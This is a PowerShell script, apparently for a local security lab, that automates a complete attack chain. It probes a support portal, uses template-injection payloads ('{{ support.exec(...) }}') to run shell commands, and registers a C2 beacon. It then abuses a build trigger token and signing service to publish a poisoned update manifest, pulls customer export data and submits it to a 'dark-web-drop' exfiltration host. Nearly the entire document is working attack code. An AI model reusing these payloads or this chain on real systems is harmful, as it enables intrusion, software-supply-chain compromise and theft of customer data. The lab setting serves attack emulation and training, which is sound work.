$ErrorActionPreference = "Stop"

$LabRoot = Resolve-Path (Join-Path $PSScriptRoot "..")

function Invoke-SupportPortalPython {
  param(
    [Parameter(Mandatory = $true)]
    [string]$Code
  )

  if (Get-Command docker -ErrorAction SilentlyContinue) {
    $Code | docker compose exec -T support-portal python -
    return
  }

  if (-not (Get-Command wsl -ErrorAction SilentlyContinue)) {
    throw "Neither Docker CLI nor WSL is available. Start Docker in WSL or install Docker CLI on Windows."
  }

  $wslLabRoot = ((wsl -d Ubuntu-24.04 -- wslpath -a $LabRoot.Path) -join "").Trim()
  $Code | wsl -d Ubuntu-24.04 -- bash -lc "cd '$wslLabRoot' && docker compose exec -T support-portal python -"
}

Write-Host "[0] Recon through edge-proxy"
Invoke-RestMethod http://localhost:28081/ | Out-Null
Invoke-RestMethod http://localhost:28081/docs/ | Out-Null
Invoke-RestMethod http://localhost:28081/docs/releases/public | ConvertTo-Json
Invoke-RestMethod http://localhost:28081/service/build-info | ConvertTo-Json

Write-Host "[1] Initial access marker"
Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ 7 * 7 }}"}' | ConvertTo-Json
Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ support.exec(''cat /var/lib/support-portal/.post_exploit_marker'') }}"}' | ConvertTo-Json

Write-Host "[2] Foothold probes"
Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ support.exec(''id'') }}"}' | ConvertTo-Json
Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ support.exec(''hostname'') }}"}' | ConvertTo-Json
Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ support.exec(''ls /opt/support-portal'') }}"}' | ConvertTo-Json
Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ support.exec(''cat /tmp/orion_stage2.txt'') }}"}' | ConvertTo-Json

Write-Host "[3-10] Internal chain"
$internalChain = @'
import httpx, json

def show(title, value):
    print("\n## " + title)
    print(json.dumps(value, indent=2) if not isinstance(value, str) else value)

show("C2 register", httpx.post("http://c2-emulator:8000/beacon/register", json={
    "host": "support-portal",
    "reachable_targets": ["wiki", "ticket-service", "source-repo", "build-server", "update-server", "customer-api"],
}).json())
show("Service discovery", httpx.get("http://c2-emulator:8000/discover/services").json())
show("Build runbook", httpx.get("http://wiki:8000/pages/release/runbook-build-trigger").json())
show("Ticket clue", httpx.get("http://ticket-service:8000/tickets/OES-1287").json())
show("Release repo file", httpx.get("http://source-repo:8000/files/release-pipeline/release.json").json())
show("Build job", httpx.post("http://build-server:8000/api/jobs", json={
    "repo": "orionecho/echo-agent",
    "ref": "refs/heads/release/2.6.4",
    "channel": "anrc",
    "trigger_token": "build-trigger-demo-7f3a91",
}).json())
artifact = httpx.get("http://build-server:8000/api/artifacts/art-demo-001").json()
show("Artifact metadata", artifact)
canonical = {
    "product": "EchoAgent",
    "channel": "anrc",
    "version": "2.6.4",
    "build_id": "build-2026-0502-001",
    "artifact": {
        "name": artifact["name"],
        "sha256": artifact["sha256"],
        "url": "http://updates.release.local/artifacts/" + artifact["name"],
        "size_bytes": artifact["size_bytes"],
    },
    "metadata": {"customer": "anrc", "lab_marker": artifact["marker"]},
}
signature = httpx.post("http://signing-service:8000/api/sign", json={"canonical_manifest": canonical}).json()["signature"]
manifest = dict(canonical)
manifest["signature"] = signature
published = httpx.post("http://update-server:8000/internal/publish", json={"channel": "anrc", "manifest": manifest}).json()
show("Sign and publish", {"manifest": manifest, "published": published})
show("Customer poll", httpx.post("http://customer-app:8000/api/poll-now").json())
show("Customer metadata", httpx.get("http://customer-api:8000/metadata").json())
show("Facilities", httpx.get("http://customer-api:8000/facilities").json())
show("Audits", httpx.get("http://customer-api:8000/audits").json())
show("Exports", httpx.get("http://customer-api:8000/exports").json())
detail = httpx.get("http://customer-api:8000/exports/exp-2026-Q2-007").json()
show("Export detail", detail)
final_object = httpx.get(detail["presigned_url"]).text
show("Final object", final_object)
bundle = httpx.post("http://dark-web-drop:8000/drop/submit", json={
    "filename": "project-orion-echo-final.txt",
    "export_id": detail["id"],
    "object_key": detail["object_key"],
    "file_content": final_object,
}).json()
show("Supervisor drop verdict", bundle)
show("Dark Web drop status", httpx.get("http://dark-web-drop:8000/drop/status/" + bundle["submission_id"]).json())
'@

Invoke-SupportPortalPython $internalChain
